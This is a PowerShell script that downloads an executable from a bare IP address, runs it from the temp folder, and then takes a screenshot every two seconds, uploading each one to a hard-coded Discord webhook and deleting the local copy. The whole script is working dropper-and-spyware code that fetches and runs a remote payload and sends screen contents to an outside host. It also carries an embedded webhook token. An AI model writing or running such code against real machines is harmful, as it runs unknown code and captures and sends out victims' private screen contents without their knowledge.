# PowerShell script for automatic download, execution and continuous screenshots to Discord
# Discord Webhook URL
$DiscordWebhookUrl = "https://discord.com/api/webhooks/1403987740567011470/Eoe1cp6z27B_Stb_PVS-GSZmwu7-Xa5eksrjPRfNeZq9Us37Ot0OvClxzWycCMHst9S5"

# Check webhook URL
if ([string]::IsNullOrEmpty($DiscordWebhookUrl)) {
    Write-Host "ERROR: Discord webhook URL is required!" -ForegroundColor Red
    exit 1
}

# Variables
$downloadUrl = "http://134.112.16.95/awe.exe"
$fileName = "awe.exe"
$downloadPath = Join-Path $env:TEMP $fileName
$screenshotCounter = 1

Write-Host "Starting script execution..." -ForegroundColor Green

try {
    # 1. Download file
    Write-Host "1. Downloading file from $downloadUrl..." -ForegroundColor Cyan
    
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($downloadUrl, $downloadPath)
    
    Write-Host "File successfully downloaded to: $downloadPath" -ForegroundColor Green
    
    # 2. Execute file
    Write-Host "2. Running downloaded file..." -ForegroundColor Cyan
    
    $process = Start-Process -FilePath $downloadPath -PassThru
    Write-Host "File executed (PID: $($process.Id))" -ForegroundColor Green
    
    # Load .NET assemblies for screenshots
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    Write-Host "3. Starting continuous screenshots every 2 seconds..." -ForegroundColor Cyan
    Write-Host "Press Ctrl+C to stop the script" -ForegroundColor Yellow
    
    # Continuous screenshot loop every 2 seconds
    while ($true) {
        try {
            Start-Sleep -Seconds 2
            
            Write-Host "Taking screenshot #$screenshotCounter..." -ForegroundColor Magenta
            
            # Get screen dimensions
            $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            
            # Create bitmap for screenshot
            $bitmap = New-Object System.Drawing.Bitmap $screenBounds.Width, $screenBounds.Height
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            
            # Take screenshot
            $graphics.CopyFromScreen($screenBounds.Location, [System.Drawing.Point]::Empty, $screenBounds.Size)
            
            # Save screenshot with counter
            $screenshotPath = Join-Path $env:TEMP "screenshot_$screenshotCounter.png"
            $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
            
            # Dispose resources
            $graphics.Dispose()
            $bitmap.Dispose()
            
            # Send screenshot to Discord
            Write-Host "Sending screenshot #$screenshotCounter to Discord..." -ForegroundColor Cyan
            
            # Read screenshot as bytes
            $screenshotBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
            
            # Create multipart form data
            $boundary = [System.Guid]::NewGuid().ToString()
            $encoding = [System.Text.Encoding]::UTF8
            
            # Build request body
            $bodyLines = @()
            $bodyLines += "--$boundary"
            $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"screenshot_$screenshotCounter.png`""
            $bodyLines += 'Content-Type: image/png'
            $bodyLines += ''
            
            # Convert to string for binary data
            $bodyText = ($bodyLines -join "`r`n") + "`r`n"
            $bodyBytes = $encoding.GetBytes($bodyText)
            
            # Add binary image data
            $footerText = "`r`n--$boundary--`r`n"
            $footerBytes = $encoding.GetBytes($footerText)
            
            # Combine all parts
            $totalBytes = $bodyBytes + $screenshotBytes + $footerBytes
            
            # Send POST request
            $webRequest = [System.Net.HttpWebRequest]::Create($DiscordWebhookUrl)
            $webRequest.Method = "POST"
            $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
            $webRequest.ContentLength = $totalBytes.Length
            $webRequest.Timeout = 10000  # 10 second timeout
            
            # Write data to stream
            $requestStream = $webRequest.GetRequestStream()
            $requestStream.Write($totalBytes, 0, $totalBytes.Length)
            $requestStream.Close()
            
            # Get response
            $response = $webRequest.GetResponse()
            $responseCode = $response.StatusCode
            $response.Close()
            
            if ($responseCode -eq "NoContent" -or $responseCode -eq "OK") {
                Write-Host "Screenshot #$screenshotCounter sent successfully!" -ForegroundColor Green
            } else {
                Write-Host "Error sending screenshot #$screenshotCounter. Response code: $responseCode" -ForegroundColor Red
            }
            
            # Clean up this screenshot file
            if (Test-Path $screenshotPath) {
                Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
            }
            
            $screenshotCounter++
            
        } catch {
            Write-Host "Error with screenshot #$screenshotCounter : $($_.Exception.Message)" -ForegroundColor Red
            $screenshotCounter++
        }
    }
    
} catch {
    Write-Host "An error occurred: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Full error: $($_.Exception.ToString())" -ForegroundColor Red
} finally {
    Write-Host "Script stopped!" -ForegroundColor Green
}

# Usage information
Write-Host "`nTo use this script:" -ForegroundColor Yellow
Write-Host ".\auto_download_screenshot.ps1" -ForegroundColor White
Write-Host "Screenshots will be taken every 2 seconds and sent to Discord!" -ForegroundColor Green 